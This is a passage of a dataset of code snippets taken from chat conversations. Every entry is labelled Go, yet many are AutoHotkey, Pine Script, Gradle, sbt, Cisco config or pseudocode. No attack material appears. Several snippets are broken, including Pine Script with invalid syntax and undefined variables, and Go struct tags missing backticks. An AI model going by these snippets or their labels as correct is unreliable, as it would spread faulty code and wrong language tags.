    "code": "package main\n\nimport (\n    \"database/sql\"\n    _ \"github.com/go-sql-driver/mysql\"\n    \"log\"\n)\n\nfunc main() {\n    // Open a DB connection\n    db, err := sql.Open(\"mysql\", \"user:password@/dbname\")\n    if err != nil {\n        log.Fatal(err)\n    }\n    defer db.Close()\n\n    // Verify our connection is good (optional depending on use case)\n    if err := db.Ping(); err != nil {\n        log.Fatal(err)\n    }\n\n    // Further initialize Repository or Data Access Layer using 'db'\n    // Initialize services that depend on the database connection\n    // Start an application server (e.g., HTTP server)\n    // ...\n}",
    "filename": "3183f866dc08b15e956037e95e2a5c82_21.go"
  },
  {
    "conversation_hash": "3183f866dc08b15e956037e95e2a5c82",
    "code_index": 22,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"sort\"\n)\n\n// Transaction represents a crypto transaction\ntype Transaction struct {\n\tID           string\n\tSize         int // Size of the transaction in bytes\n\tFeeRate      float64 // Fee per byte\n\tSubTransactions []Transaction // Sub-transactions, if any\n}\n\n// ByFeeRate implements sort.Interface for []Transaction based on the FeeRate field.\ntype ByFeeRate []Transaction\n\nfunc (a ByFeeRate) Len() int           { return len(a) }\nfunc (a ByFeeRate) Swap(i, j int)      { a[i], a[j] = a[j], a[i] }\nfunc (a ByFeeRate) Less(i, j int) bool { return a[i].FeeRate > a[j].FeeRate } // Descending order\n\n// FillBlock adds transactions to the block, given the block size limit\nfunc FillBlock(transactions []Transaction, blockSize int) []Transaction {\n\tsort.Sort(ByFeeRate(transactions))\n\n\tvar block []Transaction\n\tvar currentSize int\n\tfor _, tx := range transactions {\n\t\t// Check if transaction can fit in the block\n\t\tif currentSize+tx.Size <= blockSize {\n\t\t\tblock = append(block, tx)\n\t\t\tcurrentSize += tx.Size\n\t\t}\n\t}\n\treturn block\n}\n\nfunc main() {\n\ttransactions := []Transaction{\n\t\t{\"tx1\", 500, 0.2, nil},\n\t\t{\"tx2\", 250, 0.55, nil},\n\t\t{\"tx3\", 750, 0.15, nil},\n\t\t{\"tx4\", 300, 0.25, nil},\n\t\t{\"tx5\", 600, 0.3, nil},\n\t}\n\n\tblockSize := 1200 // Size limit of the block in bytes\n\tblock := FillBlock(transactions, blockSize)\n\n\tfmt.Println(\"Transactions in the block:\")\n\tfor _, tx := range block {\n\t\tfmt.Printf(\"ID: %s, Size: %d, FeeRate: %.2f\\n\", tx.ID, tx.Size, tx.FeeRate)\n\t}\n}",
    "filename": "3183f866dc08b15e956037e95e2a5c82_22.go"
  },
  {
    "conversation_hash": "24daf2b49a46ee2e1d1b1d5e079c5a56",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "#Persistent\nSetTimer, CheckInactivity, 1000 ; Vérifie l'inactivité chaque seconde\nSetTimer, CheckTeamsIcon, 5000 ; Désactivé initialement, deviendra actif après l'inactivité\nreturn\n\nMouseMovedLast := A_TickCount ; Initialiser le temps de dernier mouvement\nInactiveThreshold := 5*60*1000 ; 5 minutes en millisecondes\n\nCheckInactivity:\nIf (A_TimeSincePriorHotkey > InactiveThreshold || A_TimeSinceThisHotkey > InactiveThreshold)\n{\n    If ((A_TickCount - MouseMovedLast) > InactiveThreshold)\n    {\n        ; L'utilisateur est inactif depuis plus que InactiveThreshold\n        SetTimer, CheckTeamsIcon, 5000 ; Active la vérification de l'icône toutes les 5 secondes\n    }\n}\nElse\n{\n    MouseMovedLast := A_TickCount ; Réinitialiser le temps de dernier mouvement si activité détectée\n    SetTimer, CheckTeamsIcon, Off ; Désactive la vérification si l'utilisateur est actif\n}\nreturn\n\nCheckTeamsIcon:\nImageSearch, FoundX, FoundY, 0, 0, A_ScreenWidth, A_ScreenHeight, * C:\\Users\\bmansour\\Documents\\Figma\\Pomelo Kit\\image1.png\nIf (ErrorLevel = 0) ; Image trouvée\n{\n    SoundPlay, C:\\Windows\\Media\\Ring07.wav\n    SetTimer, CheckTeamsIcon, Off ; Optionnel : Arrêtez le timer si vous voulez jouer l'alarme une seule fois\n}\nreturn",
    "filename": "24daf2b49a46ee2e1d1b1d5e079c5a56_0.go"
  },
  {
    "conversation_hash": "f21c989ffdb01c58b39018c951eeafa0",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "#Persistent ; The script remains active\nSetTimer, CheckMouseMovement, 250 ; Check for mouse movement every 250 ms\n\nglobal lastMouseX, lastMouseY\nglobal idleTime := 0\nMouseGetPos, lastMouseX, lastMouseY ; Get initial mouse position\n\nreturn\n\nCheckMouseMovement:\nMouseGetPos, currentX, currentY\nif (currentX = lastMouseX) and (currentY = lastMouseY)\n{\n    ; No mouse movement detected\n    idleTime += 250 ; Increment the idle time counter by 250 ms\n    if (idleTime >= 300000) ; 5 minutes in milliseconds\n    {\n        idleTime := 0 ; Reset idle time\n        CheckTeamsIcon() ; Trigger Teams image detection\n    }\n}\nelse\n{\n    ; Mouse has moved, reset the idle time counter\n    idleTime := 0\n    lastMouseX := currentX\n    lastMouseY := currentY\n}\nreturn\n\nCheckTeamsIcon:\n{\n    ; Make sure Teams is in the foreground for the image search\n    IfWinExist, ahk_exe Teams.exe\n    {\n        WinActivate ; Activate the Teams window\n    }\n    else\n    {\n        ; If Teams is not open, then open it or adjust the command below to your need\n        Run, \"C:\\Users\\bmansour\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe\"\n    }\n    \n    ; Allow a brief delay for the Teams window to activate\n    Sleep, 1000\n\n    ; Search for the image\n    ImageSearch, FoundX, FoundY, 0, 0, A_ScreenWidth, A_ScreenHeight, C:\\Users\\bmansour\\Documents\\Figma\\Pomelo Kit\\image2.png\n    if (ErrorLevel = 0) ; Image found\n    {\n        SoundPlay, C:\\Windows\\Media\\Ring07.wav\n        ; Reactivate the inactivity check\n        SetTimer, CheckMouseMovement, 250\n    }\n    else\n    {\n        ; The image was not found, start the inactivity timer again\n        SetTimer, CheckMouseMovement, 250\n    }\n}\nreturn",
    "filename": "f21c989ffdb01c58b39018c951eeafa0_1.go"
  },
  {
    "conversation_hash": "3489029d47c1cf4a5e7df3e31e18f82b",
    "code_index": 12,
    "language": "Go",
    "libraries": [],
    "code": "name := \"csv-to-kafka\"\n\nversion := \"0.1\"\n\nscalaVersion := \"2.12.10\"\n\nlibraryDependencies ++= Seq(\n  \"org.apache.spark\" %% \"spark-core\" % \"3.1.1\",\n  \"org.apache.spark\" %% \"spark-sql\" % \"3.1.1\",\n  \"org.apache.spark\" %% \"spark-streaming\" % \"3.1.1\",\n  \"org.apache.spark\" %% \"spark-sql-kafka-0-10\" % \"3.1.1\",\n  \"org.apache.kafka\" %% \"kafka\" % \"2.8.0\",\n  \"org.slf4j\" % \"slf4j-simple\" % \"1.7.30\"\n)",
    "filename": "3489029d47c1cf4a5e7df3e31e18f82b_12.go"
  },
  {
    "conversation_hash": "d93a0d2c04e9b50a009cfac779bbd49f",
    "code_index": 17,
    "language": "Go",
    "libraries": [],
    "code": "android {\n    // ... other configurations remain\n\n    sourceSets {\n        main {\n            jniLibs.srcDirs = ['src/main/jniLibs']\n        }\n    }\n}",
    "filename": "d93a0d2c04e9b50a009cfac779bbd49f_17.go"
  },
  {
    "conversation_hash": "66e38a916900e7beb6eb611a7a66633e",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "conf t\n     ip default-gateway <gateway_ip>\n     vlan 1\n     ip address <ip_address> <subnet_mask>\n     exit\n     write memory",
    "filename": "66e38a916900e7beb6eb611a7a66633e_0.go"
  },
  {
    "conversation_hash": "6ea225fc89b28097dfe6fd31f75f5f09",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=5\nindicator(\"SMA Crossover Buy/Sell Signals\", overlay=true)\n\n// User-defined parameters\nfastLength = input(9, title=\"Fast SMA Period\")\nslowLength = input(21, title=\"Slow SMA Period\")\ntakeProfitPercent = input(1.5, title=\"Take Profit (%)\")\n\n// Calculating the simple moving averages\nfastSMA = ta.sma(close, fastLength)\nslowSMA = ta.sma(close, slowLength)\n\n// Plotting the SMAs\nplot(fastSMA, title=\"Fast SMA\", color=color.blue)\nplot(slowSMA, title=\"Slow SMA\", color=color.red)\n\n// Generating buy and sell signals\nbuySignal = ta.crossover(fastSMA, slowSMA)\nsellSignal = ta.crossunder(fastSMA, slowSMA)\n\nplotshape(series=buySignal, title=\"Buy Signal\", location=location.belowbar, color=color.green, style=shape.labelup, text=\"BUY\")\nplotshape(series=sellSignal, title=\"Sell Signal\", location=location.abovebar, color=color.red, style=shape.labeldown, text=\"SELL\")\n\n// Assuming positions are entered at the close of the signal bar\nvar float: buyPrice = na\nvar float: takeProfitPrice = na\n\nif buySignal\n    buyPrice := close\n    takeProfitPrice := close * (1 + takeProfitPercent / 100)\n    \n// Plotting the take profit level\nif not na(buyPrice)\n    line.new(bar_index[1], takeProfitPrice, bar_index, takeProfitPrice, width=1, color=color.purple, style=line.style_dashed)\n    \n// Updating the take profit line and resetting if a new buy signal appears\nif buySignal or (sellSignal and not na(takeProfitPrice) and close < takeProfitPrice)\n    line.delete(line.get_line(line.count - 1))\n    buyPrice := na\n    takeProfitPrice := na",
    "filename": "6ea225fc89b28097dfe6fd31f75f5f09_0.go"
  },
  {
    "conversation_hash": "bd810a973dc570b290e1e4a0cdce9992",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport \"fmt\"\n\nfunc binarySearch(arr []int, target int) int {\n    left, right := 0, len(arr)-1\n\n    for left <= right {\n        mid := left + (right-left)/2\n\n        if arr[mid] == target {\n            return mid\n        } else if arr[mid] < target {\n            left = mid + 1\n        } else {\n            right = mid - 1\n        }\n    }\n\n    return -1\n}\n\nfunc main() {\n    arr := []int{1, 3, 5, 7, 9, 11, 13}\n    target := 7\n    index := binarySearch(arr, target)\n\n    if index != -1 {\n        fmt.Printf(\"目标元素 %d 在数组中的索引为 %d\\n\", target, index)\n    } else {\n        fmt.Printf(\"数组中不存在目标元素 %d\\n\", target)\n    }\n}",
    "filename": "bd810a973dc570b290e1e4a0cdce9992_0.go"
  },
  {
    "conversation_hash": "8a5c06a845c3856cdea318416eadc932",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "http {\n    ...\n    server {\n        ...\n        listen 80 fastopen=256; # Enable TCP Fast Open with a queue length of 256\n        ...\n    }\n}",
    "filename": "8a5c06a845c3856cdea318416eadc932_6.go"
  },
  {
    "conversation_hash": "0c2fd3f40d172222940cc1e3ed19e848",
    "code_index": 15,
    "language": "Go",
    "libraries": [],
    "code": "1. Определите переменные:\n   x := 6\n   X := 0.5\n   Y := -3.8\n\n2. Вычислите выражения:\n   C := 2.53 * x^0.3 + Y\n   A := (5 * X / (Y + 3) + 5) / abs(X - (Y / (2 * X + 1)))\n   B := sin(X + A) / (2.46 + A * Y) + X^(1/5) / (5 * A)",
    "filename": "0c2fd3f40d172222940cc1e3ed19e848_15.go"
  },
  {
    "conversation_hash": "0c2fd3f40d172222940cc1e3ed19e848",
    "code_index": 16,
    "language": "Go",
    "libraries": [],
    "code": "1. Используйте функции rand и randi для генерации случайных чисел.\n   Матрицы D и B размером 6x6, вектор-столбец V1 и вектор-строку V2:\n   \n   D := randi(1, 100, 6, 6)\n   B := randi(1, 100, 6, 6)\n   V1 := randi(1, 100, 6, 1)\n   V2 := randi(1, 100, 1, 6)",
    "filename": "0c2fd3f40d172222940cc1e3ed19e848_16.go"
  },
  {
    "conversation_hash": "0c2fd3f40d172222940cc1e3ed19e848",
    "code_index": 17,
    "language": "Go",
    "libraries": [],
    "code": "1. D1: Выбор 1, 2, 3 столбцов и 2, 3, 4, 5 строк матрицы D\n   D1 := D(1..4, 0..2)\n   \n2. D2: Обнуление 3-го столбца матрицы D\n   D2 := D\n   D2(:, 2) := 0\n   \n3. D3: Удаление 1-го столбца из матрицы D\n   D3 := D(0..5, 1..5)\n   \n4. D4: Поменять местами 6-й и 3-й столбцы в матрице D\n   D4 := D\n   D4(:, 2) := D(:, 5)\n   D4(:, 5) := D(:, 2)",
    "filename": "0c2fd3f40d172222940cc1e3ed19e848_17.go"
  },
  {
    "conversation_hash": "0c2fd3f40d172222940cc1e3ed19e848",
    "code_index": 18,
    "language": "Go",
    "libraries": [],
    "code": "1. Сложение матриц:\n   E := D + B\n   \n2. Матричное умножение:\n   F := D * B\n   \n3. Поэлементное умножение:\n   G := D .* B\n   \n4. Поэлементное деление:\n   H := D ./ B\n   \n5. Транспонирование матрицы:\n   J := transpose(D)",
    "filename": "0c2fd3f40d172222940cc1e3ed19e848_18.go"
  },
  {
    "conversation_hash": "0c2fd3f40d172222940cc1e3ed19e848",
    "code_index": 19,
    "language": "Go",
    "libraries": [],
    "code": "1. Для вектора V1:\n   Длина вектора:\n   lengthV1 := size(V1, 1)\n   Минимальный и максимальный элементы:\n   minValueV1 := min(V1)\n   maxValueV1 := max(V1)\n   \n2. Для матрицы D:\n   Элементы главной диагонали:\n   mainDiagD := diag(D)\n   След матрицы:\n   traceD := trace(D)\n   Суммы/произведения по строкам/столбцам:\n   sumRowsD := sum(D, 2)\n   sumColsD := sum(D, 1)\n   prodRowsD := product(D, 2)\n   prodColsD := product(D, 1)",
    "filename": "0c2fd3f40d172222940cc1e3ed19e848_19.go"
  },
  {
    "conversation_hash": "0c2fd3f40d172222940cc1e3ed19e848",
    "code_index": 20,
    "language": "Go",
    "libraries": [],
    "code": "1. Определите матрицу коэффициентов A и вектор свободных членов b:\n   A2 := randi(1, 10, 2, 2)\n   b2 := randi(1, 10, 2, 1)\n   \n   A3 := randi(1, 10, 3, 3)\n   b3 := randi(1, 10, 3, 1)\n   \n2. Используйте оператор решения систем уравнений (напоминающий обратную черту в Matlab) в Mathcad:\n   x2 := A2 \\ b2\n   x3 := A3 \\ b3\n   \n3. Метод Крамера неудобен в Mathcad для больших систем, однако для n=2 или n=3 его можно рассчитать следующим образом:\n   detA2 := det(A2)\n   xCramer2 := (1/detA2) * augment(det(augment(b2, A2(:,1))), det(augment(A2(:,0), b2)))\n   \n   detA3 := det(A3)\n   xCramer3 := (1/detA3) * augment(det(augment(b3, A3(:,1), A3(:,2))), det(augment(A3(:,0), b3, A3(:,2))), det(augment(A3(:,0), A3(:,1), b3)))",
    "filename": "0c2fd3f40d172222940cc1e3ed19e848_20.go"
  },
  {
    "conversation_hash": "6ab9f9439c0baa8584527f8cb2459aaa",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstrategy(title=\"Rain On Me V2 Strategy\", shorttitle='ROM V2', overlay=true, max_bars_back=300)\n\n//Inputs\natrper  = input(defval=14, title=\"ATR Period\")\natrmult = input(defval=2, title=\"ATR Multiplier\", type=input.float, minval=0.5, maxval=100, step=0.1)\n\n//Settings\nratr = atr(atrper)\nnl = atrmult * ratr\n\n//Calculation\nratrts = float(na)\nratrts := iff(close > nz(ratrts[1], 0) and close[1] > nz(ratrts[1], 0), max(nz(ratrts[1]), close - nl), iff(close < nz(ratrts[1], 0) and close[1] < nz(ratrts[1], 0), min(nz(ratrts[1]), close + nl), iff(close > nz(ratrts[1], 0), close - nl, close + nl)))\n\nindir = int(na)\nindir := iff(close[1] < nz(ratrts[1], 0) and close > nz(ratrts[1], 0), 1, iff(close[1] > nz(ratrts[1], 0) and close < nz(ratrts[1], 0), -1, nz(indir[1], 0)))\n\nposbear = false\nposbear := nz(posbear[1], false)\nposbull = false\nposbull := nz(posbull[1], false)\natrsell = not posbear and indir == -1\natrbuy = not posbull and indir == 1\n\nif atrsell\n    posbull := false\n    posbear := true\n    strategy.close(\"Long\")\n    strategy.entry(\"Short\", strategy.short)\n\nif atrbuy\n    posbull := true\n    posbear := false\n    strategy.close(\"Short\")\n    strategy.entry(\"Long\", strategy.long)\n\n// Additional properties for strategy such as commission, slippage, etc.\n// Example to set a strategy property:\n// strategy.risk.allow_entry_in(strategy.direction.all)",
    "filename": "6ab9f9439c0baa8584527f8cb2459aaa_0.go"
  },
  {
    "conversation_hash": "6ab9f9439c0baa8584527f8cb2459aaa",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstrategy(title=\"Rain On Me V2 Strategy\", shorttitle='ROM V2', overlay=true, max_bars_back=300)\n\n//Inputs\natrper  = input(defval=14, title=\"ATR Period\")\natrmult = input(defval=2, title=\"ATR Multiplier\", type=input.float, minval=0.5, maxval=100, step=0.1)\n\n// Calculation for ATR-based Buy/Sell\nratr = atr(atrper)\nnl = atrmult * ratr\nratrts = float(na)\nratrts := iff(close > nz(ratrts[1], low) and close[1] > nz(ratrts[1], low), max(nz(ratrts[1]), close - nl),\n            iff(close < nz(ratrts[1], high) and close[1] < nz(ratrts[1], high), min(nz(ratrts[1]), close + nl),\n            iff(close > nz(ratrts[1], low), close - nl, close + nl)))\n\nvar float longStopPrice = na\nvar float shortStopPrice = na\nlongStopPrice := if (close > longStopPrice[1] and close[1] > longStopPrice[1]) or atrbuy\n    then max(longStopPrice[1], close - nl) \n    else close - nl\n\nshortStopPrice := if (close < shortStopPrice[1] and close[1] < shortStopPrice[1]) or atrsell\n    then min(shortStopPrice[1], close + nl) \n    else close + nl\n\natrbuy := close[1] < longStopPrice and close > longStopPrice\natrsell := close[1] > shortStopPrice and close < shortStopPrice\n\n// Check if we should close short and open long\nif (atrbuy)\n    if (strategy.position_size < 0)\n        strategy.close(\"Short\")\n    strategy.entry(\"Long\", strategy.long)\n\n// Check if we should close long and open short\nif (atrsell)\n    if (strategy.position_size > 0)\n        strategy.close(\"Long\")\n    strategy.entry(\"Short\", strategy.short)",
    "filename": "6ab9f9439c0baa8584527f8cb2459aaa_1.go"
  },
  {
    "conversation_hash": "2488a54516764d995c2677e5ff754494",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "type CustomTime struct {\n    time.Time\n}\n\nfunc (ct *CustomTime) UnmarshalJSON(b []byte) error {\n    // Ignore null, like in the main JSON package.\n    if string(b) == \"null\" || string(b) == `\"\"` {\n        return nil\n    }\n    // Parse date.\n    t, err := time.Parse(`\"`+time.RFC3339+`\"`, string(b))\n    if err != nil {\n        return err\n    }\n    ct.Time = t\n    return nil\n}",
    "filename": "2488a54516764d995c2677e5ff754494_0.go"
  },
  {
    "conversation_hash": "2488a54516764d995c2677e5ff754494",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "type AlbumMeta struct {\n    // ... other fields ...\n    Data struct {\n        Results struct {\n            // ... other fields ...\n            AvailableFrom    CustomTime  `json:\"availableFrom\"`\n            AvailableUntil   CustomTime  `json:\"availableUntil\"`\n            // ... other fields ...\n        } `json:\"results\"`\n    } `json:\"data\"`\n}",
    "filename": "2488a54516764d995c2677e5ff754494_1.go"
  },
  {
    "conversation_hash": "2488a54516764d995c2677e5ff754494",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"time\"\n)\n\ntype MyTransport struct{}\n\ntype WriteCounter struct {\n\tTotal      uint64\n\tTotalStr   string\n\tDownloaded uint64\n\tPercentage int\n}\n\ntype Config struct {\n\tEmail            string\n\tPassword         string\n\tUrls             []string\n\tOutPath          string\n\tTrackTemplate    string\n\tDownloadBooklets bool\n\tMaxCoverSize     bool\n\tKeepCover        bool\n\tLanguage         string\n}\n\ntype Args struct {\n\tUrls    []string `arg:\"positional, required\"`\n\tOutPath string   `arg:\"-o\"`\n}\n\ntype Auth struct {\n\tResponseStatus  string `json:\"response_status\"`\n\tUserID          string `json:\"user_id\"`\n\tCountry         string `json:\"country\"`\n\tLastname        string `json:\"lastname\"`\n\tFirstname       string `json:\"firstname\"`\n\tSessionID       string `json:\"session_id\"`\n\tHasSubscription bool   `json:\"has_subscription\"`\n\tStatus          string `json:\"status\"`\n\tFilter          string `json:\"filter\"`\n\tHasfilter       string `json:\"hasfilter\"`\n}\n\ntype TrackMeta struct {\n\tPlaylistAdd string `json:\"playlistAdd\"`\n\tIsFavorite  string `json:\"isFavorite\"`\n\tID          string `json:\"id\"`\n\tTitle       string `json:\"title\"`\n\tArtist      string `json:\"artist\"`\n\tArtistID    string `json:\"artistId\"`\n\tLabel       string `json:\"label\"`\n\tLabelID     string `json:\"labelId\"`\n\tLicensor    string `json:\"licensor\"`\n\tLicensorID  string `json:\"licensorId\"`\n\tTrackNumber int    `json:\"trackNumber\"`\n\tCopyright   string `json:\"copyright\"`\n\tGenre       string `json:\"genre\"`\n\tPlaytime    int    `json:\"playtime\"`\n\tUPC         string `json:\"upc\"`\n\tISRC        string `json:\"isrc\"`\n\tURL         string `json:\"url\"`\n\tFormat      string `json:\"format\"`\n}\n\ntype Covers struct {\n\tTitle      string `json:\"title\"`\n\tType       string `json:\"type\"`\n\tDocumentID string `json:\"document_id\"`\n\tMaster     struct {\n\t\tFileURL string `json:\"file_url\"`\n\t} `json:\"master\"`\n\tPreview struct {\n\t\tFileURL string `json:\"file_url\"`\n\t} `json:\"preview\"`\n\tThumbnail struct {\n\t\tFileURL string `json:\"file_url\"`\n\t} `json:\"thumbnail\"`\n}\n\ntype CustomTime struct {\n\ttime.Time\n}\n\nfunc (ct *CustomTime) UnmarshalJSON(b []byte) error {\n\tstrInput := string(b)\n\tif strInput == \"null\" || strInput == `\"\"` {\n\t\treturn nil\n\t}\n\tt, err := time.Parse(`\"`+time.RFC3339+`\"`, strInput)\n\tif err != nil {\n\t\treturn err\n\t}\n\tct.Time = t\n\treturn nil\n}\n\ntype AlbumMeta struct {\n\tStatus         string `json:\"status\"`\n\tResponseStatus string `json:\"response_status\"`\n\tTest           string `json:\"test\"`\n\tData           struct {\n\t\tResults struct {\n\t\t\tShopURL          string      `json:\"shop_url\"`\n\t\t\tAvailableFrom    CustomTime  `json:\"availableFrom\"`\n\t\t\tAvailableUntil   CustomTime  `json:\"availableUntil\"`\n\t\t\tBooklet          string      `json:\"booklet\"`\n\t\t\tPublishingStatus string      `json:\"publishingStatus\"`\n\t\t\tID               string      `json:\"id\"`\n\t\t\tTitle            string      `json:\"title\"`\n\t\t\tArtist           string      `json:\"artist\"`\n\t\t\tArtistID         string      `json:\"artistId\"`\n\t\t\tBiography        string      `json:\"biography\"`\n\t\t\tLabel            string      `json:\"label\"`\n\t\t\tLabelID          string      `json:\"labelId\"`\n\t\t\tLicensor         string      `json:\"licensor\"`\n\t\t\tLicensorID       string      `json:\"licensorId\"`\n\t\t\tDdexDate         string      `json:\"ddexDate\"`\n\t\t\tCopyright        string      `json:\"copyright\"`\n\t\t\tTrackCount       int         `json:\"trackCount\"`\n\t\t\tIsLeakBlock      bool        `json:\"isLeakBlock\"`\n\t\t\tCopyrightYear    int         `json:\"copyrightYear\"`\n\t\t\tImportDate       string      `json:\"importDate\"`\n\t\t\tGenre            string      `json:\"genre\"`\n\t\t\tPlaytime         int         `json:\"playtime\"`\n\t\t\tProductionYear   int         `json:\"productionYear\"`\n\t\t\tReleaseDate      time.Time   `json:\"releaseDate\"`\n\t\t\tSubgenre         string      `json:\"subgenre\"`\n\t\t\tUPC              string      `json:\"upc\"`\n\t\t\tShortDescription string      `json:\"shortDescription\"`\n\t\t\tCaption          string      `json:\"caption\"`\n\t\t\tTags             string      `json:\"tags\"`\n\t\t\tIsFavorite       string      `json:\"isFavorite\"`\n\t\t\tTracks           []TrackMeta `json:\"tracks\"`\n\t\t\tCover            Covers      `json:\"cover\"`\n\t\t} `json:\"results\"`\n\t} `json:\"data\"`\n}",
    "filename": "2488a54516764d995c2677e5ff754494_3.go"
  },
  {
    "conversation_hash": "2488a54516764d995c2677e5ff754494",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "type AlbumMeta struct {\n  // ...\n  Data struct {\n    Results struct {\n      // ...\n      AvailableFrom    CustomTime  `json:\"availableFrom\"`\n      AvailableUntil   CustomTime  `json:\"availableUntil\"`\n      // ...\n    } `json:\"results\"`\n  } `json:\"data\"`\n}",
    "filename": "2488a54516764d995c2677e5ff754494_4.go"
  },
  {
    "conversation_hash": "2488a54516764d995c2677e5ff754494",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "// ... rest of your structs.go content ...\n\ntype CustomTime struct {\n    Time time.Time\n    Valid bool // Valid is true if Time is not the zero value.\n}\n\nfunc (ct *CustomTime) UnmarshalJSON(b []byte) error {\n    s := strings.Trim(string(b), `\"`)\n    if s == \"null\" || s == \"\" {\n        ct.Valid = false\n        return nil\n    }\n    t, err := time.Parse(time.RFC3339, s)\n    if err != nil {\n        return err\n    }\n    ct.Time = t\n    ct.Valid = true\n    return nil\n}\n\nfunc (ct *CustomTime) MarshalJSON() ([]byte, error) {\n    if !ct.Valid {\n        return []byte(\"null\"), nil\n    }\n    return []byte(fmt.Sprintf(`\"%s\"`, ct.Time.Format(time.RFC3339))), nil\n}\n\ntype AlbumMeta struct {\n    // ... Your existing fields ...\n    Data           struct {\n        Results struct {\n            // ... rest of your fields ...\n            AvailableFrom    CustomTime  `json:\"availableFrom\"`\n            AvailableUntil   CustomTime  `json:\"availableUntil\"`\n            // ... rest of your fields ...\n        } `json:\"results\"`\n    } `json:\"data\"`\n}\n// ... rest of your structs.go content ...",
    "filename": "2488a54516764d995c2677e5ff754494_5.go"
  },
  {
    "conversation_hash": "2488a54516764d995c2677e5ff754494",
    "code_index": 6,
    "language": "Go",
    "libraries": [],
    "code": "func checkAvail(availAt CustomTime) bool {\n    if !availAt.Valid {\n        // Handle the case where the availableAt time is invalid or not provided\n        return true // or false, depending on what your logic should be when the date is absent\n    }\n    return time.Now().Unix() >= availAt.Time.Unix()\n}",
    "filename": "2488a54516764d995c2677e5ff754494_6.go"
  },
  {
    "conversation_hash": "19bac2eb5e3157a809a76469445c4660",
    "code_index": 11,
    "language": "Go",
    "libraries": [],
    "code": "type AlbumMeta struct {\n\tStatus         string json:\"status\"\n\tResponseStatus string json:\"response_status\"\n\tTest           string json:\"test\"\n\tData           struct {\n\t\tResults struct {\n\t\t\t// ... [other fields] ...\n\t\t\t\n\t\t\t// Change all time fields to string to avoid parsing errors\n\t\t\tReleaseDate      string      json:\"releaseDate\"\n\t\t\t\n\t\t\t// ... [other fields] ...\n\t\t} json:\"results\"\n\t} json:\"data\"\n}",
    "filename": "19bac2eb5e3157a809a76469445c4660_11.go"
  },
  {
    "conversation_hash": "19bac2eb5e3157a809a76469445c4660",
    "code_index": 12,
    "language": "Go",
    "libraries": [],
    "code": "releaseDate := result.ReleaseDate // Assuming you have the result.ReleaseDate as string\nvar parsedTime time.Time\nif releaseDate != \"\" && releaseDate != \"\\\"\\\"\" { // Check if releaseDate is neither empty nor invalid\n\tparsedTime, err = time.Parse(`\"`+time.RFC3339+`\"`, releaseDate)\n\tif err != nil {\n\t\t// handle the error, maybe with a log statement or however your app needs to deal with it\n\t}\n}\n// Use parsedTime as a time.Time object",
    "filename": "19bac2eb5e3157a809a76469445c4660_12.go"
  },
  {
    "conversation_hash": "0b27669ed4aa5db14236d8c006f35bac",
    "code_index": 12,
    "language": "Go",
    "libraries": [],
    "code": "plugins {\n    id 'java'\n}\n\ngroup 'com.yourdomain'\nversion '1.0-SNAPSHOT'\n\nrepositories {\n    mavenCentral()\n    maven {\n        url = 'https://hub.spigotmc.org/nexus/content/repositories/snapshots/'\n    }\n}\n\ndependencies {\n    // Replace with the version you are targeting\n    compileOnly 'org.bukkit:bukkit:1.19-R0.1-SNAPSHOT'\n}\n\njar {\n    manifest {\n        attributes(\n                'Main-Class': 'com.yourdomain.customdolphins.CustomDolphins'\n        )\n    }\n    // Ensure the plugin.yml file is included in the jar\n    from('src/main/resources/plugin.yml')\n}",
    "filename": "0b27669ed4aa5db14236d8c006f35bac_12.go"
  },
  {
    "conversation_hash": "c73e01621fb777d103e7253eb8d6bbeb",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "name webrpcExample\nversion v1\n\ntype User {\n  id int64\n  username string\n}\n\nservice ChatRoomRPC {\n  Ping(msg string) (pong string)\n  Join(user User) bool\n}",
    "filename": "c73e01621fb777d103e7253eb8d6bbeb_0.go"
  },
  {
    "conversation_hash": "c73e01621fb777d103e7253eb8d6bbeb",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n  \"log\"\n  \"net/http\"\n)\n\nfunc main() {\n  http.HandleFunc(\"/\", func(w http.ResponseWriter, r *http.Request) {\n    w.Write([]byte(\"Hello, World!\"))\n  })\n\n  log.Fatal(http.ListenAndServe(\":8080\", nil))\n}",
    "filename": "c73e01621fb777d103e7253eb8d6bbeb_2.go"
  },
  {
    "conversation_hash": "c73e01621fb777d103e7253eb8d6bbeb",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"log\"\n    \"net/http\"\n    \"github.com/gorilla/websocket\"\n)\n\nvar upgrader = websocket.Upgrader{\n    ReadBufferSize:  1024,\n    WriteBufferSize: 1024,\n}\n\nfunc handleConnections(w http.ResponseWriter, r *http.Request) {\n    // Upgrade initial GET request to a websocket\n    ws, err := upgrader.Upgrade(w, r, nil)\n    if err != nil {\n        log.Fatal(err)\n    }\n    defer ws.Close()\n\n    // Register new client and defer unregistration\n    clients[ws] = true\n\n    for {\n        var msg Message // A custom struct for your messages\n        // Read in a new message as JSON\n        err := ws.ReadJSON(&msg)\n        if err != nil {\n            delete(clients, ws)\n            break\n        }\n        // Handle incoming messages (e.g., store offers, answers, ice candidates)\n        // ...\n    }\n}\n\nfunc main() {\n    // Create a simple file server for serving the frontend\n    fs := http.FileServer(http.Dir(\"../public\"))\n    http.Handle(\"/\", fs)\n\n    // Configure websocket route\n    http.HandleFunc(\"/ws\", handleConnections)\n\n    // Start the server on localhost port 8080 and log any errors\n    log.Println(\"http server started on :8080\")\n    err := http.ListenAndServe(\":8080\", nil)\n    if err != nil {\n        log.Fatal(\"ListenAndServe: \", err)\n    